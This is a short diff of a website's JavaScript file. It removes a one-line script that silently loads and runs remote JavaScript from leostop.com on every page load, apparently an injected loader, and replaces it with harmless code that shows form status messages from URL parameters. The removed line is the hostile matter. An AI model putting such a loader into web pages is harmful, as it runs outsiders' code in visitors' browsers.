@@ -40,7 +40,21 @@ $(function () {
 
 
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	var params = new URLSearchParams(window.location.search);
+	var statusMessages = {
+		invalid: 'Please check the information you entered and try again.',
+		match: 'Passwords do not match.',
+		exists: 'That email address is already registered.',
+		success: 'Your request was completed successfully.'
+	};
+	var statusKey = params.get('error') || params.get('signup') || params.get('sent') || params.get('login');
+	if (statusKey && statusMessages[statusKey]) {
+		var status = document.querySelector('[data-form-status]');
+		if (status) {
+			status.textContent = statusMessages[statusKey];
+			status.classList.add('is-visible', params.get('error') ? 'is-error' : 'is-success');
+		}
+	}
 	/* Toggle sidebar
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
